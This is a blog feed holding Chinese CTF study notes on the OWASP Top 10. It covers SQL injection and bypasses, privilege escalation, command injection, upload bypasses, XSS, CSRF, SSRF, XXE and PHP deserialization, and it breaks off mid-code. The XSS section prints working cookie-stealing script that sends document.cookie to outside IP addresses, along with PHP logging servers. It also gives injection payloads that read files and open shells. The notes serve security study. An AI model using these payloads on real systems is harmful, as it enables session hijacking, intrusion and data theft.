{
    "version": "https://jsonfeed.org/version/1",
    "title": "alazymachine • All posts by \"exploit\" tag",
    "description": "",
    "home_page_url": "https://alazymechnaic.github.io",
    "items": [
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/owasp-top10-hui-zong/",
            "url": "https://alazymechnaic.github.io/2024/03/04/owasp-top10-hui-zong/",
            "title": "OWASP top10 汇总",
            "date_published": "2024-03-04T06:45:25.000Z",
            "content_html": "<h1 id=\"CTF-Web-OWASP-Top10\"><a href=\"#CTF-Web-OWASP-Top10\" class=\"headerlink\" title=\"CTF Web OWASP Top10\"></a>CTF Web OWASP Top10</h1><h1 id=\"注入漏洞\"><a href=\"#注入漏洞\" class=\"headerlink\" title=\"注入漏洞\"></a>注入漏洞</h1><ol>\n<li><p>SQL注入</p>\n<ol>\n<li>字符型注入</li>\n</ol>\n<p><strong>1. information_schema.tables where table_schema=database() 2. information_schema.columns where table_name=’查询到的表名’ # 查看列名</strong></p>\n<ol>\n<li><p>数字型注入</p>\n</li>\n<li><p>宽字节注入</p>\n<ol>\n<li>产生原理：在web中对于单引号会进行转译，在前面加上反斜杠进行转译操作，但是0x5C和前面的0xbf会组成一个字符，从而造成后面的0x27逃逸。0x5cbf是一个中文GBK编码里的一个汉字</li>\n<li>一些函数<a href=\"http://www.baidu.com/link?url=9cRbUwRIrAuYAB6IXVQCP3RAy6b7IEVDAtWJ30s_SZ3mrkZvhI9rcB-Jmg0SflArh_S6yOMxBxbzIIjd3IOQ6dVDC5v5tpWhgDGAlrypqIW\">addslashes</a>函数会将特殊字符加个反斜杠转译</li>\n<li>解决方法：同一数据库，web应用，操作系统所使用的数据集。对数据进行正确的转译</li>\n</ol>\n</li>\n<li><p>延时注入</p>\n<ol>\n<li>页面并不会给出任何的回显，利用sleep函数和字符串处理函数进行正误的反馈</li>\n</ol>\n</li>\n<li><p>报错注入</p>\n<ol>\n<li><p>常用函数</p>\n<ol>\n<li><p>XPATH</p>\n</li>\n<li><p>floor</p>\n<ol>\n<li>向下取整函数，当其余count和order by进行连用时会出现报错</li>\n</ol>\n</li>\n<li><p>updatexml</p>\n<ol>\n<li>第二个参数必须是一个有效的XPATH，因此可以成select语句，</li>\n<li></li>\n</ol>\n<p><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030143612631.png\" alt=\"image-20221030143612631\"></p>\n</li>\n<li><p>extractvalue</p>\n<ol>\n<li>与updatexml的原理类似，都是用于xpath路径错误所导致的</li>\n</ol>\n</li>\n<li><p>geometrycollection</p>\n</li>\n<li><p>multipoint</p>\n</li>\n<li><p>polygon</p>\n</li>\n<li><p>exp</p>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>布尔注入</p>\n<ol>\n<li>页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(<strong>输入语句的真假直接影响整条查询语句最后查询的结果的真假</strong>)</li>\n<li><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144059058.png\" alt=\"image-20221030144059058\"></li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>堆叠注入</p>\n<ol>\n<li>原因是网站使用了mysql_multi_query()函数进行SQL的查询，导致一次进行了多次查询</li>\n<li>可以在直接在后面加上分号开始执行另一条语句</li>\n</ol>\n</li>\n<li><p>二次注入</p>\n<ol>\n<li>例如用户注册时对于用的输入内容进行严格的转译，防止mysql执行含有特殊字符及字符串的sql语句，但是当在注册时将内容插入到数据库的内容并不存在转义符，因此可以尝试再次使用例如修改密码等操作，使其取出数据库的payload拼接到新的sql语句中执行</li>\n<li>解决方法: 保证数据流安全，对于外部提交的数据始终保持一个审慎的状态，即便是从数据库中查出的内容也进行严格的过滤</li>\n</ol>\n</li>\n<li><p>绕过方法：</p>\n<ol>\n<li><p>空格的绕过方法</p>\n<ol>\n<li>编码后的TAB符</li>\n<li>圆括号</li>\n<li>闭合注释/**/</li>\n</ol>\n</li>\n<li><p>等于号的绕过</p>\n<ol>\n<li>sth in sth</li>\n<li>like</li>\n</ol>\n</li>\n<li><p>select</p>\n<ol>\n<li><p>使用handler进行绕过</p>\n</li>\n<li><p><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144118632.png\" alt=\"image-20221030144118632\"></p>\n</li>\n<li><p>利用show进行代替：show columns from ‘xxx’;</p>\n</li>\n</ol>\n</li>\n<li><p>一般字符串绕过方法：</p>\n<ol>\n<li><p>大小写绕过</p>\n</li>\n<li><p>利用prepare将字符串中的关键词拆开：</p>\n</li>\n<li><p><img src=\"https://github.com/alazymechnaic/HustCTFer/blob/main/CTF%20Web/CTF_Web_OWASP_top10.assets/image-20221030144136360.png\" alt=\"image-20221030144136360\"></p>\n</li>\n<li><p>使用reverse函数将字符串进行绕过，或者使用char函数将字符写作ascii码进行绕过</p>\n</li>\n<li><p>使用CHAR函数，SELECT FROM Users WHERE username = <strong>CHAR</strong>(101, 97, 105, 116)或者char(101)+char(97)+char(105)+char(116)</p>\n</li>\n</ol>\n</li>\n<li><p>替换逗号</p>\n<ol>\n<li>使用join函数</li>\n<li><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144147705.png\" alt=\"image-20221030144147705\"></li>\n</ol>\n</li>\n<li><p>大于小于号绕过</p>\n<ol>\n<li>使用greatest函数，将取出的字符和对应的字符进行比较</li>\n<li>用于布尔注入或者延时注入时的二分查找法</li>\n</ol>\n</li>\n<li><p>sleep函数绕过</p>\n<ol>\n<li>使用反复执行md5函数的操作延长执行时间</li>\n<li><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144158798.png\" alt=\"image-20221030144158798\"></li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>mysql的基本操作</p>\n<ol>\n<li>插入一条数据：INSERT INTO tb_courses (course_id,course_name,course_grade,course_info) VALUES(1,’Network’,3,’Computer Network’);</li>\n<li>删除一条数据：DELETE FROM tb_courses WHERE course_id=4;</li>\n<li>修改数据 UPDATE table_name SET field1=new-value1, field2=new-value2 where id=xxx；</li>\n</ol>\n</li>\n<li><p>SQL注入读写文件 1.</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429028.png\" alt=\"image-20221030144208544\"></p>\n<ol>\n<li><p>1’ union select ,1,(Select load_file(‘c:/phpstudy/www/1.txt’)),3%23</p>\n</li>\n<li><p>修改sql的日志位置，但是需要提供绝对路径 1.</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429891.png\" alt=\"image-20221030144218177\"></p>\n</li>\n</ol>\n</li>\n<li><p>SQL注入提权</p>\n<ol>\n<li>mof提权<ol>\n<li>mof文件是windows系统下的一个托管文件，其作用是每隔五秒就会去监控进程创建和死亡，其本身使用的是管理员权限来完成该任务，mysql中上传mof文件到一个可读可写的目录中，而后使用sql语句替换对应的内容，</li>\n<li>Select load_file(“上传文件的路径”) into dumpfile “配置文件所在路径” ，mof文件中存在一些提权vbs脚本，一般是添加管理员账户等行为。</li>\n</ol>\n</li>\n<li>udf提权<ol>\n<li>要求secure-file-priv参数设置为空，设置为null禁止mysql导入和导出</li>\n<li>对目录有写出权限</li>\n<li>编写恶意的udf文件替换udf.dll文件</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>SQL注入getshell</p>\n<ol>\n<li>mysql中使用system pwd方式可以执行系统命令，也可以使用cmd_shell</li>\n<li>session包含方式getshell</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429924.png\" alt=\"image-20221030144228649\"></p>\n<ol>\n<li>慢查询日志getshell</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429941.png\" alt=\"image-20221030144241107\"></p>\n</li>\n</ol>\n<h2 id=\"防御手段：可以采用预编译的方式进行。\"><a href=\"#防御手段：可以采用预编译的方式进行。\" class=\"headerlink\" title=\"防御手段：可以采用预编译的方式进行。\"></a>防御手段：可以采用预编译的方式进行。</h2><ol>\n<li><p>过滤函数：</p>\n</li>\n<li><p>命令注入</p>\n<ol>\n<li><p>php执行系统命令的函数：</p>\n<ol>\n<li><p>system，eval，assert，call_user_func，shell_exec，passthru，proc_open()</p>\n</li>\n<li><p>读文件的命令more，less，head查看前几行的内容，tac从最后一行开始读内容,od以二进制的方式读取内容，file -f从报错中可以看到具体内容</p>\n</li>\n<li><p>绕过方法：</p>\n<ol>\n<li><p>字符串绕过 ip2long函数更改字符串的类型为long类型，但同样在传入后可以执行</p>\n</li>\n<li><p>使用URL编码进行注入</p>\n</li>\n<li><p>分号拼接，&amp;&amp;符拼接，将前一个内容的输入为空，和后面管道符拼接后继续或者使用||当前一个命令执行不成功时执行后面一个命令</p>\n</li>\n<li><p>命令嵌套 echo “result ${uname -a}”</p>\n</li>\n<li><p>${IFS}用于进行空格的替换，cat&lt;flag.txt用于代替空格，php环境下可以用tab（编码后即%09）</p>\n</li>\n<li><p>关键词绕过</p>\n<ol>\n<li>Windows下可以使用大小写</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429970.png\" alt=\"image-20221030144252391\"></p>\n<ol>\n<li>base64的编码方式：</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429034.png\" alt=\"image-20221030144259834\"></p>\n</li>\n</ol>\n</li>\n<li><p>修复方法</p>\n<ol>\n<li>强过滤：<ol>\n<li>stripslashes() 剔除反斜杠</li>\n<li>addslashes() 给特殊字符增加反斜杠</li>\n<li>mysql_real_escape_string() 转译在mysql中使用到的特殊字符</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>MYSQL 5.0以上与以下注入的区别：</p>\n<ol>\n<li>mysql5.0以上没有information_schema这个表，因此只能暴力跑表名</li>\n<li>5.0以下是单用户操作，5.0以上是多用户操作</li>\n</ol>\n</li>\n<li><p>SQL注入能做什么：万能密码，写入webshell，执行系统指令</p>\n</li>\n<li><p>文件读取函数：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgets(),show_source()</p>\n</li>\n</ol>\n<h1 id=\"中间件漏洞\"><a href=\"#中间件漏洞\" class=\"headerlink\" title=\"中间件漏洞\"></a>中间件漏洞</h1><h1 id=\"文件上传漏洞\"><a href=\"#文件上传漏洞\" class=\"headerlink\" title=\"文件上传漏洞\"></a>文件上传漏洞</h1><p>绕过方式：</p>\n<ul>\n<li>前端JS验证：<ul>\n<li>禁用JS</li>\n<li>抓包该文件内容/文件名</li>\n</ul>\n</li>\n<li>MIME验证<ul>\n<li>修改Content-Type中的内容为image/jepg</li>\n</ul>\n</li>\n<li>服务端验证后缀：<ul>\n<li>php更改为畸形后缀，例如phtml，php，php3等内容</li>\n<li>当目标主机是windows时可以尝试采用大小写绕过的方式</li>\n<li>::$DATA备用数据流的绕过方式</li>\n<li>上传.htaccess文件更改当前文件夹下的解析规则，将jpg文件按照php文件的格式进行解析</li>\n</ul>\n</li>\n<li>%00截断；（php5.3以下才可以使用，且要求上传的文件名就是最终存储的文件名，或者最终存储的文件名是可控的，问题出现在存储时，上传时需要手动解码以下00）</li>\n<li>配合文件包含漏洞使用，构造图片马，copy a.jpg + b.php 1.jpg</li>\n<li>中间件的解析漏洞（IIS6.0的未知后缀会一直向前解析；条件竞争</li>\n</ul>\n<p>防御方法：白名单检查；随机化存储路径；上传的目录限制执行权限；网站服务器和文件服务器二者分离；限制文件的大小</p>\n<h1 id=\"XSS漏洞\"><a href=\"#XSS漏洞\" class=\"headerlink\" title=\"XSS漏洞\"></a>XSS漏洞</h1><h2 id=\"反射型XSS\"><a href=\"#反射型XSS\" class=\"headerlink\" title=\"反射型XSS\"></a>反射型XSS</h2><hr>\n<p>反射型XSS，当传入的用户信息被当做JS代码执行。反射型XSS仅在GET方法时，引诱用户点击链接，是有危害性的。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>) # 弹出用户cookie<br></code></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\"># 在服务器上搭建接收cookie的页面</span><br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$cookie</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cookie'</span>];<br><span class=\"hljs-variable\">$ip</span> = <span class=\"hljs-title function_ invoke__\">getenv</span> (<span class=\"hljs-string\">'REMOTE_ADDR'</span>);<br><span class=\"hljs-variable\">$time</span> = <span class=\"hljs-title function_ invoke__\">date</span>(<span class=\"hljs-string\">'Y-m-d g:i:s'</span>);<br><span class=\"hljs-variable\">$fp</span> = <span class=\"hljs-title function_ invoke__\">fopen</span>(<span class=\"hljs-string\">\"cookie.txt\"</span>,<span class=\"hljs-string\">\"a\"</span>);<br><span class=\"hljs-title function_ invoke__\">fwrite</span>(<span class=\"hljs-variable\">$fp</span>,<span class=\"hljs-string\">\"IP: \"</span>.<span class=\"hljs-variable\">$ip</span>.<span class=\"hljs-string\">\"Date: \"</span>.<span class=\"hljs-variable\">$time</span>.<span class=\"hljs-string\">\" Cookie:\"</span>.<span class=\"hljs-variable\">$cookie</span>.<span class=\"hljs-string\">\"\\n\"</span>);<br><span class=\"hljs-title function_ invoke__\">fclose</span>(<span class=\"hljs-variable\">$fp</span>);<br><span class=\"hljs-meta\">?&gt;</span>   <br></code></pre></td></tr></tbody></table></figure>\n\n<p>构造JS代码</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">'&lt;img src=\"47.100.33.58/getcookie.php?cookie='</span>+<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>+<span class=\"hljs-string\">'\"width=0 height=0/&gt;'</span>)<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"储存型XSS\"><a href=\"#储存型XSS\" class=\"headerlink\" title=\"储存型XSS\"></a>储存型XSS</h2><hr>\n<p>盗取cookie方法</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">#前端代码</span><br>&lt;script&gt;window.<span class=\"hljs-title function_ invoke__\">open</span>(<span class=\"hljs-string\">'http://10.65.20.196:8080/cookie.asp?msg='</span>+document.cookie)&lt;/script&gt;<br><br><span class=\"hljs-comment\"># 服务端</span><br> <span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cook'</span>])){<br>    <span class=\"hljs-variable\">$msg</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cook'</span>];<br>    <span class=\"hljs-variable\">$time</span>=<span class=\"hljs-string\">' | '</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'year'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'mon'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'mday'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'hours'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'minutes'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'seconds'</span>].<span class=\"hljs-string\">' Cookie: '</span>;<br>    <span class=\"hljs-variable\">$ip</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">\"REMOTE_ADDR\"</span>].<span class=\"hljs-title function_ invoke__\">md5</span>((<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">\"REMOTE_ADDR\"</span>].<span class=\"hljs-string\">'salt'</span>));<br>    <span class=\"hljs-title function_ invoke__\">file_put_contents</span>(<span class=\"hljs-variable\">$ip</span>.<span class=\"hljs-string\">'.txt'</span>,PHP_EOL.<span class=\"hljs-variable\">$time</span>.<span class=\"hljs-variable\">$msg</span>, FILE_APPEND);<br>}<span class=\"hljs-keyword\">else</span>{<br>    <span class=\"hljs-variable\">$msg</span>=<span class=\"hljs-number\">0</span>;<br>}<br><br><br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"DOM型XSS\"><a href=\"#DOM型XSS\" class=\"headerlink\" title=\"DOM型XSS\"></a>DOM型XSS</h2><ol>\n<li><p>DOM即是Document object model</p>\n</li>\n<li><p>DOM型是通过修改或读取document的属性和方法进行攻击，既有反射性也有存储型，而且没有与服务器进行交互</p>\n</li>\n<li><p>DOM型XSS的程序只有HTML代码，并不存在服务器代码</p>\n</li>\n<li><p>DOM型XSS的输出是由DOM操作产生的，</p>\n</li>\n<li><p>危害：</p>\n<ol>\n<li>盗取cookie，配合CSRF</li>\n<li>劫持会话</li>\n<li>网络钓鱼</li>\n<li>骚套路打后台告警</li>\n<li>控制受害主机向其他网站发起攻击</li>\n<li>传播跨站脚本蠕虫</li>\n</ol>\n</li>\n<li><p>防御方法：</p>\n<ol>\n<li>htmlspecialchars 和 htmlentities函数进行过滤</li>\n<li>设置Http only机制可以防止cookie被盗取</li>\n<li>验证Refer字段</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"CSRF原理\"><a href=\"#CSRF原理\" class=\"headerlink\" title=\"CSRF原理\"></a>CSRF原理</h1><ol>\n<li>跨站请求伪造：原理是利用网站对于用户网页浏览器的信任，挟持用户当前已经登陆的web身份，去执行非用户本意的操作</li>\n<li>流程：生成跨站请求链接，诱导用户点击链接，劫持用户的cookie</li>\n<li>可以是GET型也可以是POST型，POST型的表单存存放在黑客网站的页面中，当用户访问黑客的页面时会造成利用用户的浏览器身份向服务器发送请求</li>\n<li>防御：使用http的refer字段进行验证，添加CSRF token验证,在每次请求时服务器都会给用户不同的token</li>\n</ol>\n<h1 id=\"SSRF原理\"><a href=\"#SSRF原理\" class=\"headerlink\" title=\"SSRF原理\"></a>SSRF原理</h1><ol>\n<li>服务器请求伪造，指的是在攻击者未能取得服务器的权限时以服务器的身份发送一条构造好的请求给服务器所在的内网主机发送消息，外部网络一般无法访问内部网络，要依靠该漏洞作为跳板请求内网主机。主要原因是从其他服务器应用获取数据的功能但是没有对目标地址做过滤和探测。例如分享时会加载一些页面，就是对外部的请求，例如给个链接进行翻译，给定一个资源链接开始下载资源</li>\n<li>产生SSRF的漏洞的函数：<ol>\n<li>file_get_contents（）支持php://input</li>\n<li>sockopen()</li>\n<li>curl_exec()</li>\n</ol>\n</li>\n<li>可以使用的协议有哪些：<ol>\n<li>http协议，gopher(gopher协议不能进行URL编码），zip，file协议</li>\n</ol>\n</li>\n<li>危害：</li>\n</ol>\n<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>\n<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>\n<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>\n<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>\n<p>5.利用file协议读取本地文件等。.</p>\n<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>\n<ol>\n<li>防御方法：<ol>\n<li>过滤返回信息，确保用户请求的返回内容符合标准</li>\n<li>统一的错误信息，避免用户根据错误信息来判断端口的状态</li>\n<li>使用DNS缓存或者HOST的白名单的方式进行防御</li>\n<li>限制协议为http或者https.</li>\n</ol>\n</li>\n<li>绕过方法：<ol>\n<li>短网址</li>\n<li>将IP地址改为十六进制表示</li>\n<li>特殊域名可以利用[::]来绕过localhost [<a href=\"http://169.254.169.254>>http://[::169.254.169.254](http://169.254.169.254%3E%3Ehttp/%5b::169.254.169.254)]\">http://169.254.169.254&gt;&gt;http://[::169.254.169.254](http://169.254.169.254%3E%3Ehttp/%5b::169.254.169.254)]</a></li>\n</ol>\n</li>\n</ol>\n<h1 id=\"XXE原理\"><a href=\"#XXE原理\" class=\"headerlink\" title=\"XXE原理\"></a>XXE原理</h1><ol>\n<li>XXE漏洞即XML外部实体注入，当xml引用外部实体并进行解析时会产生的漏洞，xml解析器会获取其中的外部资源并存储到内部实体中，攻击者可以引用外部资源并存储到内部实体中，攻击者可以引用外部实体对目标进行文件读取，命令执行，DDOS，内网探测等操作</li>\n<li>解决方法：<ol>\n<li>在php的libxml_disable_entity_loader(true) 不允许加载外部实体</li>\n<li>过滤用户提交的xml数据，比如entity，system等</li>\n<li>配置XML处理器禁用DTD，禁止外部实体解析，通过黑名单过滤用户提交的数据</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"反序列化漏洞\"><a href=\"#反序列化漏洞\" class=\"headerlink\" title=\"反序列化漏洞\"></a>反序列化漏洞</h1><h2 id=\"前导知识\"><a href=\"#前导知识\" class=\"headerlink\" title=\"前导知识\"></a>前导知识</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 两个重要的函数</span><br><span class=\"hljs-title function_ invoke__\">serialize</span>()<br><span class=\"hljs-title function_ invoke__\">unserialize</span>()<br><span class=\"hljs-comment\">//第一个是将传入的字符串转换为对象，第二个则是将对象转换为字符串</span><br><span class=\"hljs-comment\">//序列化后的字符串</span><br>O:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"DemoClass\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"name\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"john\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"sex\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"Women\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"age\"</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">\"18\"</span>;}<br><span class=\"hljs-comment\">// 其中O代表是个对象，后面的数代表对象类别的名字长度，然后是对象名称，最后是对象中的元素数量</span><br><span class=\"hljs-comment\">//s代表后面的对象元素是字符串，若为数字则是i</span><br>O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Name\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"\\0Name\\0username\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"admin\"</span>;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"\\0Name\\0password\"</span>;i:<span class=\"hljs-number\">100</span>;}<br><span class=\"hljs-comment\">// 若为private，则需要在类名和字段名前面都加上\\0  (python)  若为URL提交则需要\\0替换为%00</span><br><span class=\"hljs-comment\">//数组,则需要用中括号，其中第一个为i表明数字，标号使用0</span><br>s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"nickname\"</span>;a:<span class=\"hljs-number\">1</span>:{i:<span class=\"hljs-number\">0</span>;s:<span class=\"hljs-number\">204</span>:<span class=\"hljs-string\">\"whe\"</span>;} <span class=\"hljs-comment\">//后面不跟分号</span><br><br><span class=\"hljs-comment\">//其中s代表当前属性的值为str类型格式为s:长度:\"字符串内容\"，当为int型时，则使用i:数字   </span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433022.png\" alt=\"image-20200803145952668\"></p>\n<p><a href=\"https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>\n<h2 id=\"私有和保护属性\"><a href=\"#私有和保护属性\" class=\"headerlink\" title=\"私有和保护属性\"></a>私有和保护属性</h2><figure class=\"highlight llvm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><span class=\"hljs-keyword\">private</span>属性在进行序列化时会在成员名前加上<span class=\"hljs-variable\">%00</span>类名<span class=\"hljs-variable\">%00</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433033.png\" alt=\"image-20200803152828191\"></p>\n<p>Example是当前类的类名，其中filename是当前的成员名</p>\n<figure class=\"highlight llvm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><span class=\"hljs-keyword\">protected</span>要在成员名前加上<span class=\"hljs-variable\">%00</span>*<span class=\"hljs-variable\">%00</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433029.png\" alt=\"image-20200803152817741\"></p>\n<p><strong>序列化他只序列化属性，不序列化方法</strong></p>\n<p><strong>类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击</strong></p>\n<h3 id=\"魔法函数\"><a href=\"#魔法函数\" class=\"headerlink\" title=\"魔法函数\"></a>魔法函数</h3><figure class=\"highlight scss\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//魔法函数</span><br><span class=\"hljs-built_in\">__construct</span>()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。<br><br><span class=\"hljs-built_in\">__destruct</span>()，类的析构函数，反序列化时调用\t<br><br><span class=\"hljs-built_in\">__call</span>()，在对象中调用一个不可访问方法时调用<br><br><span class=\"hljs-built_in\">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><br><span class=\"hljs-built_in\">__get</span>()，获得一个类的成员变量时调用，当访问一个不存在的属性时也会触发该操作<br><br><span class=\"hljs-built_in\">__set</span>()，设置一个类的成员变量时调用<br><br><span 